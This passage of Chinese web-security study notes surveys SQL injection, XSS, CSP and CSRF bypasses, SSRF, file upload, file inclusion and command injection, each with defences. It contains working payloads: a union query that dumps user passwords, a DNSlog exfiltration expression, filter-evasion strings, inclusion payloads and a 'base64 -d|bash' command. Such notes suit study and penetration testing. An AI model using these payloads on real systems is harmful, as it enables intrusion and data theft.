username =&#39;admin&#39;; SQL注入的利用 获取数据库信息 在权限足够的情况下写入一句话木马，获取webshell SQL注入绕过方法 注释符绕过：/*xxx*/、-- 、# 大小写绕过 内联绕过：/*!...*/ 双写绕过 特殊编码绕过 空格过滤绕过：用/**/、()、%0a、tap、两个空格等代替 逻辑运算符过滤绕过：and = &amp;&amp;，or = ||，xor = |，not = ! 过滤等号绕过：用like替换=，rlike模糊匹配，大于小于号来限定范围，!&lt;&gt;与=同效果，使用函数、关键字（strcmp()，between） 过滤大小于号绕过：greatest(n1,n2,n3..)返回n中的最大值；strcmp()，in关键字（in(&#39;s&#39;)），between 过滤引号绕过：将参数用十六进制编码就不用带引号，采用编码 过滤逗号绕过： substr(str from pos for len)代替（在str中从pos个开始读取len长度的子串） join代替，union select * from (select 1)a join (select 2)b join(select 3)c等价于union select 1,2,3 like代替，select user() like &quot;r%&quot;;等价于select ascii(substr(user(),1,1))=114; offset代替，limit 1 offset 2等价于limit 2,1 过滤函数绕过：用其他函数替代 sleep() &#x3D;&#x3D; benchmark() ascii() &#x3D;&#x3D; hex() &#x3D;&#x3D; bin() group_concat() &#x3D;&#x3D; concat_ws() substr() &#x3D;&#x3D; substring() &#x3D;&#x3D; mid() &#x3D;&#x3D; left() &#x3D;&#x3D; right() user() &#x3D;&#x3D; @@user datadir &#x3D;&#x3D; @@datadir ord() &#x3D;&#x3D; ascii() SQL注入无回显 使用DNSlog外带，dnslog日志中会返回我们查询的信息，使用load_file函数，需要root权限，secure_file_priv变量值为空就可以加载任意位置的文件；&#96;load_file(concat(‘\\&#39;,(version()),’dnslog地址\\111’)) 利用时间盲注 SQL注入防御方法 验证用户输入内容的合法性，过滤掉敏感字符及关键字；客户端和服务端都要验证，避免攻击者通过抓包修改数据来绕过客户端验证； 使用转义函数将一些特殊字符进行转义（在PHP中使用addslashes()等函数进行转义（开启magic_quote_gpc&#x3D;on）） 使用预编译：编译sql语句用?占位，当用户输入后将参数替换进预先编译好的sql语句，不用再编译一次，因为sql注入是在编译过程中发生的，所以预编译能起到防御作用。例如Java中使用prepareStatement进行预编译； 不能使用预编译的地方，如表名、列名处，可以将用户的输入用反引号包裹，这样既不会影响 SQL 语句的执行，也避免用户进行恶意拼接； 将报错信息模糊处理，不显示详细错误信息； 在数据库中以加密形式存储数据，如：将用户输入用户名、密码等进行加密处理后，再与数据库中的信息进行比对。 SQLmap使用方法语法：python sqlmap.py -u url -D schema_name -T table_name --columns参数： –dbs 查询所有数据库 –users 查询所有数据库的用户 –tables 查询表名 –columns 查询列名 –data 带入查询数据 –dump 输出查询内容 –dbms 指定数据库 –count 统计结果条数 –level 测试等级 手动查表列名数据库名：?id=-1&#39; union select 1,(group_concat(schema_name) from information_schema.schcemata),3 --+表名：?id=-1&#39; union select 1,(group_concat(table_name) from information_schema.tables where table_schema = &#39;security&#39;),3 --+列名：?id=-1&#39; union select 1,(group_concat(column_name) from information_schema.columns where table_schema = &#39;security&#39; and table_name = &#39;users&#39;),3 --+用户名和密码：?id=-1&#39; union select 1,(select group_concat(id,0x7e,username,0x7e,password) from users),3 --+ XSS一、概述跨站脚本攻击（重点在于脚本的执行）。攻击者向存在漏洞的网站页面注入恶意代码，可被浏览器执行，造成攻击。是由于对用户输入的内容过滤不足而产生的。 二、反射型 原理：经过后端，不经过数据库，攻击是一次性的，受害者点击恶意连接，触发xss脚本。 常见位置：网站搜索栏，用户登录口等地方，用来窃取客户端Cookies或钓鱼欺骗 攻击步骤1.攻击者构造出特殊的URL，其中包含恶意代码.2.用户打开有恶意代码的URL时，网站服务器端将恶意代码从URL取出，拼接在HTML返回给浏览器.3.用户浏览器接收到响应后解析执行，混在其中的恶意代码也会被执行。4.恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户行为，调用目标网站接口执行攻击者指定的操作。 三、存储型 原理：攻击者先将恶意代码通过一定手段储存到数据库中，只要受害者浏览该网站，恶意代码就会被执行。恶意代码一直存在。 常见位置：网站留言，评论区，博客日志交互处。 攻击步骤1.攻击者将恶意代码提交到目标网站的数据库中。2.用户打开目标网站时，网站服务端将恶意代码从数据库中取出，拼接在HTML中返回给浏览器。3.用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。4.恶意代码窃取用户数据并发送到攻击者的网站，或冒充用户行为，凋用目标网站接口执行攻击者指定的操作. 防御服务器接收到数据，在存储到数据库之前，进行转义和过滤危险字符;前端接收到服务器传递过来的数据，在展示到页面前，先进行转义&#x2F;过滤; 四、DOM型 DOM型是一种基于DOM文档对象模型的一种漏洞，客户端的脚本程序可以通过DOM动态修改页面内容，从客户端获取DOM中数据并在本地执行 原理：实际上就是前端javascript代码不够严谨，把不可信的内容插入到了页面。 好处：构造的URL参数不用发送到服务端，可以达到绕过WAF、躲避服务端检测的效果。 攻击步骤 攻击者构造出特殊的URL，其中包含恶意代码。 用户点击这个URL后，浏览器会处理这个响应，执行恶意代码，从而改变DOM结构 根据代码内容可以窃取用户数据发送到攻击者的网站，或冒充用户行为，调用目标网站接口执行攻击者指定的操作. DOM型XSS攻击中，取出和执行恶意代码由浏览器端完成，属于前端javascript自身的安全漏洞。（不与服务端交互）[xss-1] DOM型防护策略当网页输出到&lt;script&gt;时，先用encodeForJavaScript对它编码，然后再判断document.write()输出的位置，如果输出到HTML页面，则使用encodeForHTML编一次码，如果是输出到Javascript，则使用encodeForJavaScript编一次码。 XSS蠕虫：XSS蠕虫一般发生在需要在用户之间发生交互行为的地方，一般同时结合了反射型和存储型。 XSS蠕虫与传统蠕虫相比的特点： 攻击载体不同。传统蠕虫的攻击与传播是在用户结点之间，容易引发网络阻塞；XSS蠕虫的攻击与传播一般是在用户节点与网络节点之间。 攻击方式不同。传统蠕虫多采用漏洞攻击，利用缓冲区溢出进行传播；XSS蠕虫则是利用社会工程学在用户和网站之间传播。 攻击环境不同。传统蠕虫是寻找有漏洞的并且容易感染的节点；XSS蠕虫跟更着重于在社交网络上传播。 XSS蠕虫传播过程：攻击者在web页面植入恶意的HTML代码，诱惑用户点击攻击者构造的恶意链接，用户点击来链接后就会备感染，然后又会自动向其他好友发送链接，通过一个人传人的模式来造成大面积的攻击。 影响因素： 利用社会工程学使得用户不会对恶意链接产生警惕； 用户的安全意识不高，对恶意链接没有辨别能力； 社交环境活跃度较高，人群大，传播广； XSS绕过 编码绕过：常见的有JS编码、HTML实体编码、URL编码 大小写绕过 双写绕过 替换绕过：alert用prompt，confirm等代替；()用双反引号代替；空格用%0a，%0d，/**/代替； %00截断 on事件绕过 有时候还可以利用浏览器的容错性绕过 标签闭合绕过 @符号绕过URL限制（在url后面添加@+路径，访问的就是@符号后面的地址） 前端过滤：burp改包绕过 注释干扰绕过：&lt;scri&lt;!--test--&gt; pt&gt; alert(1);&lt;/scr&lt;!--test--&gt; ipt&gt; XSS防御方法对于每一个输入，在客户端和服务端都需要进行各种验证，判断字符是否合法，长度是否合法，格式是否正确等；尽量使用白名单。 对输出进行编码：对所有要动态输出到页面的内容，通通进行相关的编码和转义。 面对javascript事件，将特殊字符进行转义（\\转成\\\\，/转成\\/，;转成；） 确保&lt;script&gt; &lt;style&gt; &lt;img&gt;等标签的src和href属性的值必须以http://开头，白名单方式，不能有十进制和十六进制的编码字符。 对cookie设置HttpOnly，客户端脚本就不能访问到cookie了。 利用 CSP限制浏览器只加载我们指定来源的资源，避免加载攻击者指定来源的资源，从而减轻受到XSS攻击的风险。 对输入进行检查 CSP(内容安全策略)一、概述 用于帮助检测和缓和某些类型的攻击，包括XSS和数据注入攻击。引入一些相当严格的的策略，会使扩展程序在默认情况下更安全，开发者可以创建并强制应用一些规则，管理网站允许加载的内容。简单来说就是我们的网站只接受我们指定的请求资源。 CSP实质上就是白名单制度，明确告诉客户端，哪些外部资源可以加载和执行。它的实现和执行全部由浏览器完成，开发者只需提供配置。大大增强了网页的安全性，攻击者即使发现了漏洞，也没法注入脚本。二、CSP应用 在http头中添加Content-Security-Policy字段来指定策略指令和内容源，如下：Content-Security-Policy: default-src &#39;self&#39; www.baidu.com; script-src &#39;unsafe-inline&#39; 由HTML的Meta标签指定，不过这种方式存在缺陷，每个页面都需要添加，而且不能对限制的域名进行上报，如下：&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &#39;self&#39; *.xx.com *.xx.cn &#39;unsafe-inline&#39; &#39;unsafe-eval&#39;;&quot;&gt; 一个CSP头由多组CSP策略组成，每组策略包含一个策略指令和一个内容源列表。 常用指令[CSP-1]三、内容源 源列表： 源列表是一个字符串，指定了一个或多个互联网主机（通过主机名或 IP 地址），和可选的或端口号。 关键字： none:代表空集；即不匹配任何 URL。两侧单引号是必须的。 self:代表和文档同源，包括相同的 URL 协议和端口号。两侧单引号是必须的。 unsafe-inline:允许使用内联资源，如内联的&lt;script&gt;元素、javascript: URL、内联的事件处理函数和内联的&lt;style&gt;元素，两侧单引号是必须的。 unsafe-eval:允许使用eval()等通过字符串创建代码的方法。两侧单引号是必须的。 数据： data：允许data:URL作为内容来源； mediastream：允许mediastream:URI作为内容来源。 CSP绕过 绕过default-src &#39;none&#39;(不允许加载任何内容)：可以使用meta标签实现跳转，通过下面payload可跳转至指定网站（未添加CSP），执行该网站下的脚本；?blckder02=&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1;url=; &gt; 绕过default-src ‘none’ ‘unsafe-inline’：大部分CSP不会限制跳转，可以通过跳转来获取并保存cookie；可以用 window.location.href、window.location、window.open 构造paload进行网页跳转 绕过xx-src *：frame-src设置为*，可以加载任意iframe来源的url；(使用iframe标签，不用&lt;script&gt;标签)，可以远程加载script代码。 利用浏览器补全绕过script &#39;nonce-xxx&#39;：（自动补全匹配引号）如下payload：?blckder02=&lt;p&gt;&lt;script src=&quot;; a=&quot;&lt;/p&gt;&lt;script type=&quot;text/javascript&quot; nonce=&quot;xxx&quot;&gt;document.write(&quot;blckder02&quot;)&lt;/script&gt;利用浏览器补全的功能，在插入点插入script标签的同时，添加a&#x3D;”，用这里的双引号来闭合后面的script标签中第一个属性的前双引号，从而使这两个双引号之间的内容失效；所以nonce属性就被劫持到了插入点的script标签中，首尾两个script标签闭合完整，可以正常执行js代码； 利用link标签绕过xx-src self：CSP策略中xx-src self的设置能够使大部分的XSS和CSRF都会失效，但link标签的预加载功能可以进行绕过。（用link标签构造payload） 利用Gadgets和strict-dynamic&#x2F;unsafe-eval绕过：即重用Gadgets代码来绕过CSP；假设页面中使用了Jquery-mobile库，并且CSP策略中包含”script-src ‘unsafe-eval’”或者”script-src ‘strict-dynamic’”，那么下面的向量就可以绕过CSP：&lt;div data-role=popup id=&#39;&lt;script&gt;alert(1)&lt;/script&gt;&#39;&gt;&lt;/div&gt; 利用iframe绕过： 页面A与页面B同源，页面A有CSP限制而页面B没有；可以在A页面加载B页面来绕过CSP；（用iframe标签 src 构造payload加载B页面） 利用Chrome特性禁用过滤XSS向量的库 利用浏览器缓存绕过script nonce： CSRF（跨站请求伪造）一、作用 攻击者盗用了你的身份，伪装成你发送恶意请求。CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账……造成的问题包括：个人隐私泄露以及财产安全。 主要存在情况就是受害者在某一网站上的登录未过期的情况下，点击了攻击者制作的钓鱼链接，然后攻击者获取到了受害者的cookie等身份信息，就可以冒充受害者去访问这个网站，操作受害者的账号内容。二、满足条件 目标用户语句登录的网站，能够执行网站的功能 目标用户访问了攻击者构造的URL 三、原理服务器无法准确判断当前请求是否是合法用户的自定义操作；在受害者在某一网站上的登录未过期的情况下，攻击者可以冒充受害者去访问这个网站，操作受害者的账户。 四、CSRF常见攻击类型 GET类型构造一个恶意页面，当受害者访问这个页面时，会自动向我们指定的网站发送一次HTTP请求，请求的内容直接写在URL中的；（完成一次跨域请求） POST类型构造一个恶意页面，设置一个隐藏表单，当受害者访问这个页面时，表单就会自动提交，完成恶意操作； 链接类型的CSRF CSRF防御 验证 HTTP Referer 字段：如果Referer不是来自信任网站或者是空白，就有可能是CSRF攻击。（可绕过） 在请求地址中添加 token 并验证：为了防止伪造用户的请求，在HTTP请求中以参数的形式加入一个随机产生的token，并在服务端验证是否有token和token是否正确。 在 HTTP 头中自定义属性并验证 二次验证 验证码防御 尽量使用POST CSRF绕过： 绕过Referer 如果只检测了Referer是否合法，并没有排除Referer为空的情况，就可以使用空Referer来绕过；（利用其他协议，比如data、file等；如果目标是http的站点，那么从https的站点向http站点跳转是不含Referer的） 如果目标站点只是检测Referer是否包含某个关键词，如a.com，那么我们就可以构造如poc.html?a.com来绕过； 如果Referer必须来自某个域，如b.com，那么我们可以寻找它的子域名，把poc发布到子域下，受害者点击连接，就会由子域向b.com发起请求。 绕过token 使用JSONP劫持token（构造恶意连接，在里写入获取token的代码，然后用户会向目标网站发送请求，从而成功获取到token） token存放在哪里： 存放在local Storage中，每次调用接口的时候都把它当成一个字段传给后台； 放在表单中随表单提交 CSRF修补： 如果服务器在用户登录之后给予用户一个唯一合法令牌，每一次操作过程中，服务器都会验证令牌是否正确，如果正确那么执行操作，不正确不执行操作。 一般情况下，给予的令牌写入表单隐藏域的value中，随着表单内容进行提交。 CSRF代码分析 要从代码上观察是否存在CSRF漏洞，可以看是否验证了用户是否成功登录网站，然后在用户已登录的情况下能够进行哪些操作，完全信任用户，没有对用户的操作进行其他安全限制。 如何检测CSRF： 先抓取一个正常请求的数据包，查看里面是否有token或Referer，如果有的话就把token和Referer删掉，再发送，看是否会报错，不报错的话就可能存在CSRF。 修改Referer的值，查看是否报错（和绕过referer的步骤一样） token、cookie、session：session： 当第一次访问网站时，会服务端会生成一个session和sessionid，sessionid会返回给客户端，保存在cookie中，session会保存在服务端的内存中。 cookie： cookie存放在客户端，可以用来保存服务端返回的一些信息（sessionid、tooken），每一次请求都会携带cookie，服务端就可以通过cookie中的信息来判别这次请求是否合法。（大小为4k） token： token是由服务端生成的一个字符串（存放在服务端的数据库中），用户第一次登录一个网站后，token会返回给客户端，下次发起请求就只需要携带上这个token。 SSRF一、SSRF漏洞定义 SSRF（Server-Side Request Forgery），全程“服务器端请求伪造”。是一种由攻击者构造形成，由服务端发起请求的安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统。 只要是会向其他远程服务器发起请求的地方都可能存在SSRF。二、SSRF漏洞原理 SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取资源的功能，但没有对目标地址做过滤与限制。 客户端只能通过服务端来获取内网资源，如果服务端对客户端发送的请求没有进行筛查或过滤等限制，则可能形成ssrf漏洞，从而可以直接从外网客户端访问到内网资源，获取敏感信息。 三、SSRF利用*主要利用方式： 对外网、服务器所在的内网、本地进行端口扫描，获取banner信息； 测试运行在内网或本地的应用程序； 利用file协议读取本地文件等； 对内网web应用进行指纹识别，通过访问默认文件实现 。 攻击内外网的web应用。sql注入、struct2、redis等。 常用协议： file：读取任意文件(curl -v &#39;;) http：向目标发送get请求，可以探测内网 dict：使用dict协议可以探测端口服务(curl -v &#39;dict://127.0.0.1:80&#39;)（获取一些信息，向服务器端口执行命令（6389 redis），只能一条一条执行） gopher：可以使用gopher协议构造post请求来攻击内网应用（可以先截获get请求包和post请求包，再构造成符合gopher协议的请求；需要指定端口，指定post方法，回车换行符用%0d %0a替换，传输数据的第一个字符会被吃掉，所以在数据前面要添加一个无用字符；可用于反弹shell）如何利用SSRF除探测主机外进一步进行攻击？ 四、SSRF漏洞常见位置 远程图片下载 加载远程文件 离线下载 远程摄像头 网页翻译 转码(手机自适应) weblogic配置不当，天生ssrf漏洞 从URL关键字中寻找 五、SSRF漏洞验证 先验证，请求是否是服务器端发出的，可以右键图片，使用新窗口打开图片，如果浏览器上地址栏是，说明不存在SSRF漏洞。 可以在Firebug 或者burpsuite抓包工具，查看请求数据包中是否包含这个请求。由于SSRF是服务端发起的请求，因此在加载这张图片的时候本地浏览器中不应该存在图片的请求。 在验证完是由服务端发起的请求之后，此处就有可能存在SSRF，接下来需要验证此URL是否可以来请求对应的内网地址。首先我们要获取内网存在HTTP服务且存在favicon.ico文件地址，才能验证是否是SSRF。 DNSlog检测：构造请求包，向dnslog发送请求，看dnslog上是否有解析记录，如果有，则存在SSRF漏洞 SSRF绕过方法 @ ，与http?/127.0.0.1请求是相同的 添加端口号  短地址  特殊域名(将域名指向任意IP) xxxxx.127.0.0.1.xip.io -&gt; 127.0.0.1 ip地址转换成进制来访问 192.168.0.1&#x3D;3232235521（十进制） 非HTTP协议 DNS Rebinding 302跳转绕过 使用句号代替点号：127。0。0。1 -&gt; 127.0.0.1 SSRF限制绕过技巧： 限制为域名 使用@绕过： 限制请求IP不为内网地址 采用短网址绕过 采用特殊域名绕过 采用进制转换 限制请求只为http&#x2F;https协议 采用302跳转 采用短网址 可以使用 DNS 重绑定结合TLS Session来绕过： TLS 有会话复用机制，当经过一次会话验证后，会保存 Session ID，下次会话客户端携带 Session ID，就能避证书认证和密钥生成等过程； 可以把存在 SSRF 漏洞的服务器理解为客户端，向攻击者的服务器发起 HTTPS 请求，会进行 DNS 解析，对解析后的 IP 进行校验，确认合法后再正式请求； 攻击者的服务器响应请求，并且设置 TTL 为0， 返回一个构造的恶意 Session ID 和跳转指令，客户端收到响应后，保存 Session ID，并且发生跳转； 因为 TTL 为 0 ，所以会再次进行 DNS 解析，通过 DNS 重绑定解析到另一个 IP 地址，可以是内网地址；因为域名没有变，所以还是携带之前保存的 Session ID 与新地址进行通信，这样一来就把恶意的 Session ID 发送到了内网IP地址，从而通过 Session ID 中的恶意代码达到我们的目的。 防御、修复方案： 统一错误信息，避免用户可以根据错误信息来判断远程服务器端口状态 限制请求的端口为HTTP常用的端口，比如 80,443,8080,8088等 去除 url 中的特殊字符 黑名单内网IP。 进行 DNS 解析后，将请求地址改为解析后的 IP 地址，避免 DNS 重绑定； 限制跳转操作；（若发生跳转则要重新校验目标地址） 禁用不需要的协议，仅允许HTTP和HTTPS(禁止file,dict等协议读取文件) XXE与SSRF的区别？ CSRF与SSRF的区别？ 文件上传一、概述产生原因：由于程序员未对上传的文件进行严格的验证和过滤危害：用户可以（越过其本身权限）向服务器上上传可执行的脚本文件，从而getshell。二、常见校验上传文件的方法、分类 前端JS校验概述：通过javascript代码来验证上传文件的后缀适合合法，在前端验证，还没有发送数据包。绕过：删除前端页面上的该段js验证代码 服务端校验请求头 content-type字段概述：发送数据包，判断请求头中的content-type字段是否合法：image/gif、image/png、image/jpeg绕过：MIME绕过，上传PHP文件，抓包修改content-type字段为合法类型 文件头检测概述：检测所上传的文件是否符合允许格式的范围绕过：在恶意文件的开头加入合法文件格式的文件头，如GIF-47 49 46 38 39 61（二进制，GIF98a） 黑名单，白名单校验 自定义WAF校验 三、常见绕过方法 文件幻数（文件头）检测绕过：如果检测机制要检测上传的文件是否为图片，而攻击者上传的文件不是图片，则在木马内容的前面插入对应的文件头内容，例如：JFIF(jpg图片)、GIF89a (gif文件)，PNG(png图片) 大小写，双写绕过 黑名单绕过：改为黑名单里面没有的后缀，如php3、html .htaccess上传绕过： htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。 文件内容如：SetHandler application/x-httpd-php意思是设置当前目录所有文件都使用PHP解析，就可直接上传图片马 空格绕过：抓包，在文件后缀php的后面加许多空格；验证机制不会自动去除空格，会认为是一个整体，则与php不匹配，即可绕过验证；而Windows系统下文件名中的空格会当作空处理，任然当作是php文件执行。 .号绕过：抓包在文件后缀名后面加.号php.，验证机制不会匹配，而windows系统下会去掉最后一个点号 特殊符号绕过：文件名改为如test.php::$DATA，验证机制无法匹配，而在服务器上生成的是test.php文件 路径组合绕过：根据验证机制一点点修改后缀，如去掉点、空格、转换大小写之类的 %00截断： 条件：magic_quotes_gpc&#x3D;off，php版本&lt;5.3.4 绕过原理：php内核由c语言实现，因此使用了c语言中的字符串处理函数，在连接字符串时0字节作为 字符串的结束字符，%00url解码为0x00，magic_quotes_gpc开启时会将%00转义为\\0两个单体字符，故不具备截断功能。 GET型：抓包，在文件后缀后面添加%00 POST型：bp抓包，进入hex，将后缀php后面的十六进制改为00(可先添加空格20，以便定位) 上传图片马绕过：需要结合文件包含漏洞进行利用（copy a.jpg&#x2F;b + b.php&#x2F;a c.jpg） 二次渲染： 原理：文件上传成功后，如果有经过二次渲染处理的话（所谓二次渲染就是重新在生成一次图片），容易把图片马中的PHP代码修改掉。 把php代码放在图片经过二次渲染不会被修改的位置（不同图片修改的位置不一样） 条件竞争：先将文件上传到服务器，服务器会判断文件后缀是否合法，如果合法则根据规则进行重命名等操作，不合法则删除，因此可以上传php文件，只需要在它删除之前访问即可，可以利用burp的intruder模块不断上传，然后不断的访问刷新该地址即可； 目的就是在文件还存在时执行一段php代码，比如新建一个文件，写入一句话。 常用上传函数： move_uploaded_file(file,newloc)：将上传的文件放到指定位置，若成功则返回true 否则false。 文件上传防御方法 文件扩展名服务端白名单校验 文件内容服务端校验 上传文件重命名 隐藏上传文件路径 文件上传的目录设置为不可执行 单独设置文件服务器的域名 使用安全设备防御 根据业务需要限制文件大小 文件后缀绕过的原理在Apache的解析顺序中，是从右到左开始解析文佳后缀的，如果最右侧的扩展名不可识别，就继续往左判断，知道遇到可以解析的文件后缀为止。例如：1.php.xxx 文件包含一、概述漏洞产生原因：文件包含函数加载的参数没有经过过滤或严格定义，可以被用户控制，包含其他恶意文件，导致了执行非预期代码。常见文件包含函数： require() &#x2F;&#x2F;函数出现错误时，会直接报错并退出程序执行; include() &#x2F;&#x2F;函数出现报错时，会抛出一个警告，程序继续执行; require_ once() &#x2F;&#x2F;同require()， 但仅包含一次。在脚本执行期间同个文件可能被多次引用，确保只包含一次以避免函数重定义、变量重新赋值等问题。 include_ once() &#x2F;&#x2F;同include()，但仅包含一次。 二、文件包含的类型本地文件包含： 概述：被包含的文件在本地；包含文件的内容只要符合php语法都能被当成php代码进行解析，无关后缀名是什么；若文件内容不符合PHP语法规范则会暴漏其源码。包含不存在的文件则可能暴露路径。 利用方式： 包含本地敏感文件、上传文件 包含日志文件 包含session文件 [include-2]远程文件包含 概述：被包含的文件在远程服务器 条件：远程文件包含需将php. ini中设置allow_ur_ fopen &#x3D; On (默认)、allow_url_include &#x3D; On (php5.2后默认为off,需手动设置)。 利用方式：包含攻击者指定的远程url文件，如远程包含shell php伪协议php:&#x2F;&#x2F;filter 设计用来过滤筛选文件 概述：主要用来查看源码。直接包含php文件时会被解析，不能看到源码，所以用filter来读取敏感文件，但是需要进行base64加密传输。 php:&#x2F;&#x2F;filter参数： resource&#x3D;&lt;要过滤的数据流&gt; &#x2F;&#x2F;这个参数时必须的，它指定了你要筛选过滤的数据流。 read&#x3D;&lt;读链的筛选列表&gt; &#x2F;&#x2F;该参数可选，可以设定一个或多个过滤器名称，以管道符（&#x2F;）分隔。 write&#x3D;&lt;写链的筛选列表&gt; &#x2F;&#x2F;该参数可选，可以设定一个或多个过滤器名称，以管道符（&#x2F;）分隔。 &lt;；两个链的筛选列表&gt; &#x2F;&#x2F;任何没有以read&#x3D;或write&#x3D;作前缀的筛选器列表会视情况应用于读或写链。 常见的过滤器： 字符串过滤器string.rot13 &#x2F;&#x2F;进行rot13转换string.toupper &#x2F;&#x2F;将字符全部大写string.tolower &#x2F;&#x2F;将字符全部小写string.strip_tags &#x2F;&#x2F;去除空字符、HTML和PHP标记后的结果 转换过滤器convert.base64-encode &#x2F;&#x2F;base64编码convert.base64-decode &#x2F;&#x2F;base64解码convert.quoted-printable-encode quoted-printable &#x2F;&#x2F;编码（也是另一种将二进制进行编码的方案）convert.quoted-printable-decode quoted-printable &#x2F;&#x2F;解码convert.iconv &#x2F;&#x2F;实现任意两种编码之间的转换 压缩过滤器zlib.deflate &#x2F;&#x2F;压缩过滤器zlib.inflate &#x2F;&#x2F;解压过滤器bzip2.compress &#x2F;&#x2F;压缩过滤器bzip2.decompress &#x2F;&#x2F;解压过滤器 加密过滤器mcrypt.* &#x2F;&#x2F;加密过滤器mdecrypt.* &#x2F;&#x2F;解密过滤器 payload示例：?page=php://filter/convert.base64-encode/resource=include.php 文件前面有&lt;?php exit; ?&gt;： 绕过方法一：利用php://filter协议，进行base64解码读取。 注释：base64编码中只包含64个可打印字符（大小写字母，0-9，+，&#x2F;），而PHP在解码base64时，遇到不在其中的字符时（如&lt;、?、&gt;、；），将会跳过这些字符，仅将合法字符每三个组成一个新的字符串进行解码。 [include-1] 绕过方法二： php:&#x2F;&#x2F;filter允许使用多个过滤器，先将进行base64编码，用string.strip_tags将这段代码过滤掉，再将webshell用base64解码还原。（去除空字符、HTML和PHP标记后的结果） php:&#x2F;&#x2F;input 概述：主要用来接收post数据，将post请求中的数据作为php代码执行。需要设置allow_url_fopen=0ff allow_url_include=On，但enctype=multipart/form-data 的时候php://input是无效的。 php://input添加在url中 zip:&#x2F;&#x2F;、bzip2:&#x2F;&#x2F;、zlib:&#x2F;&#x2F;协议 概述：都属于压缩流，可以访问压缩文件中的子文件。 phar:&#x2F;&#x2F;协议相当于执行包含文件内容 格式：phar://[压缩文件绝对/相对路径]/[压缩文件内的子文件名] 示例：构造URL?page=phar://../../hackable/uploads/cmd.rar/cmd.txt包含该压缩包中的文件 data:&#x2F;&#x2F;协议 概述：将原本的include的文件流重定向到了用户可控制的输入流中。需要allow_ur_ fopen = On、allow_url_include = On。 可以直接执行php代码，格式：data:text/plain,&lt;?php执行内容?&gt; 如果对特殊字符进行了过滤，可以将代码进行base64编码，格式：data:text/plain;base64,编码后的php代码 文件包含绕过方式 %00截断 条件：magic_quotes_gpc&#x3D;off，php版本&lt;5.3.4 在包含的文件后面添一个%00截断，即?file&#x3D;test.txt%00就可成功绕过。 长路径截断 条件：php版本&lt;5.2.8 Windows下目录最大长度为256字节，超出部分会被丢弃；Linux下目录最大长度为4096字节，超出部分会被丢弃。 构造url?file=phpinfo.php...................................(足够长)，长度超过规定字节后，网页代码规则自动添加的部分就会成为被丢弃的部分。 ?、#、空格绕过（适用于远程文件包含） 需设置allow_url_include &#x3D; On，#和空格需要进行url编码。 构造url为?file=都可以绕过 文件包含漏洞的防御方式 尽量不使用动态包含，无需要情况下设置allow_url_include和allow_url_fopen为关闭； 对可以包含的文件进行限制：使用白名单的方式，或者设置包含的目录，open_basedir； 严格检查用户输入，参数中不允许出现../之类的目录跳转符； 严格检查变量是否初始化； 不要仅仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。 变量覆盖： 命令执行一、管道符Windows：|直接执行后面的语句，例：ping www.baidu.com | whoami；||如果前面的命令是错误的，那么就执行后面的语句，否则只执行前面的语句；&amp;前面后后面的命令都要执行，无论前面真假；&amp;&amp;如果前面为假，后面的命令也不执行，如果前面为真，则执行两条命令； Linux：含有|、||、&amp;、&amp;&amp;、;五种管道符，;作用与&amp;一样。二、空格过滤绕过可使用$&#123;IFS&#125;：cat${IFS}flag.txt，cat${IFS}$1flag.txt，cat$IFS$1flag.txt；重定向符&lt; &gt;：cat&lt;&gt;flag.txt，cat&lt;flag.txt%09需要php环境：cat%09&#x2F;root&#x2F;flag三、黑名单绕过 拼接：a&#x3D;c;b&#x3D;at;c&#x3D;fl;d-ag;$a$b $c$d.txt base64编码：echo &quot;Y2F0IGZsYWc=&quot;|base64 -decho “Y2F0IGZsYWc&#x3D;”|base64 -d|bash 单引号，双引号：ca””t fla’’g.txt 反斜线：ca\\t fl\\ag.txt $1，$2，$@：ca$1t fla$@g.txt 四、读文件绕过cat被过滤时：more:一页一页的显示档案内容less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页head:查看头几行tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示tail:查看尾几行nl：显示的时候，顺便输出行号od:以二进制的方式读取档案内容vi:一种编辑器，这个也可以查看vim:一种编辑器，这个也可以查看sort:可以查看uniq:可以查看file -f:报错出具体内容 五、通配符绕过&#x2F;???&#x2F;?[a][t] ?’’?’’?’’?’’&#x2F;???&#x2F;?at flag&#x2F;???&#x2F;?at ????&#x2F;???&#x2F;?[a]’’[t] ?’’?’’?’’?’’ 六、内联绕过执行反引号命令和$(命令)都是执行命令的方式 七、绕过长度限制Linux中的&gt;符号和&gt;&gt;符号： 通过&gt;来创建文件：&gt;flag2.txt； 通过&gt;将命令结果存入文件中：会将原有文件内容覆盖，如果存入不存在的文件名，就会新建文件； &gt;&gt;符号的作用是将字符串添加到文件内容末尾，不会覆盖原内容 Linux中命令换行：在Linux中，当我们执行文件中的命令的时候，我们通过在没有写完的命令后面加\\，可以将一条命令写在多行；[rce-1] 所以可以在限制长度的情况下执行命令，将命令一条一条输入一个文本中再执行；[rce-2] 利用ls -t和&gt;以及换行符绕过长度限制执行命令(文件构造绕过)：在Linux中，使用ls -t命令后，可以将文件名按照时间顺序排列出来(后创建的在前面) 八、代码分析当命令执行函数的参数是由外部传入时，对传入的命令没有进行过滤和检测，导致可以利用管道符执行其他的命令。 九、命令执行常用函数传入命令并返回执行结果： exec() 只返回最后一行的结果 system() 逐行返回数据 shell_ecec() passthru() 反引号 实际就是调用shell_exec()不返回执行结果，而是返回一个文件指针 popen() proc_open() pcntl_exec() 十、命令执行与代码执行的区别 命令执行指可用执行系统或应用指令的漏洞； 代码执行指应用程序本身过滤不严，用户可以通过请求将代码注入到应用中执行； eval()和assert()函数导致的大多时因为载入缓存或模板以及对变量的处理不严格导致； preg_replace()函数用来处理字符串，需要存在&#x2F;e参数； call_user_func()和call_user_func_array()函数的功能时调用函数； array_map()函数的作用时调用函数并且除第一个参数外其他参数作为数组，通常会固定第一个参数，即调用的函数。 XXEXML外部实体注入 